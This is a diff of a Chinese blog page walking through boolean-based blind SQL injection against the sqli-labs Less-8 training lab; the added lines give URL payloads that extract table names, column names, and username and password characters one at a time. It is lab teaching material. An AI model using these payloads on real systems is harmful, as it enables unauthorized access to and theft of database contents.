@@ -419,14 +419,14 @@ SQL盲注的分类
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1k
+                        1.1k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        4 分
+                        5 分
                     </div>
                     
                 
@@ -667,7 +667,7 @@ SQL盲注的分类
 <pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(length((select database())))&gt;56%23</code></pre><p><img src="https://i.loli.net/2019/10/09/ZRunGcPSwdhg5bT.png" alt="less8-6.png"></p>
 <pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(length((select database())))=56%23</code></pre><p><img src="https://i.loli.net/2019/10/09/sePb4EIMOg19KW6.png" alt="less8-7.png"></p>
 <ol start="3">
-<li><strong>判断数据库名称</strong></li>
+<li><strong>判断数据库</strong></li>
 </ol>
 <p><strong>判断第一个字母</strong></p>
 <pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),1,1))&gt;110%23</code></pre><p><img src="https://i.loli.net/2019/10/09/KE7wlrNu1GSgVav.png" alt="less8-8.png"></p>
@@ -679,6 +679,19 @@ SQL盲注的分类
 <pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),2,1))&gt;101%23</code></pre><p><img src="https://i.loli.net/2019/10/09/w2CADSa6zbhXlNG.png" alt="less8-12.png"></p>
 <pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),2,1))=101%23</code></pre><p><img src="https://i.loli.net/2019/10/09/AMoWTIfOYiZkuJ9.png" alt="less8-13.png"></p>
 <p>注：第一个字符串的 ascii 值为 101，从上面的 ascii 表中可以找到相应的字符为 “ e ” </p>
+<ol start="4">
+<li><strong>判断表</strong></li>
+</ol>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security'limit 0,1),1,1))=101%23</code></pre><p><img src="https://i.loli.net/2019/10/15/2PojderbXO8pgEM.png" alt="less8-14.png"></p>
+<ol start="5">
+<li><strong>判断字段</strong></li>
+</ol>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),1,1))=105%23</code></pre><p><img src="https://i.loli.net/2019/10/15/QYyNs4O2FdEibtj.png" alt="less8-15.png"></p>
+<ol start="6">
+<li><strong>判断数据</strong></li>
+</ol>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select username FROM security.users limit 0,1),1,1))=68%23</code></pre><p><img src="https://i.loli.net/2019/10/15/oga2zSMfjBPUFtL.png" alt="less8-16.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select password FROM security.users limit 0,1),1,1))=105%23</code></pre><p><img src="https://i.loli.net/2019/10/15/aebTfXqFs8iWMZ9.png" alt="less8-17.png"></p>
 <h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.cnblogs.com/omnis/p/8318639.html" target="_blank" rel="noopener">【sqli-labs】 less8 GET - Blind - Boolian Based - Single Quotes (基于布尔的单引号GET盲注)</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -952,7 +965,7 @@ gitment.render('gitment-content');
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">18.7k</span>&nbsp;字
+                class="white-color">19.7k</span>&nbsp;字
                
             
 			
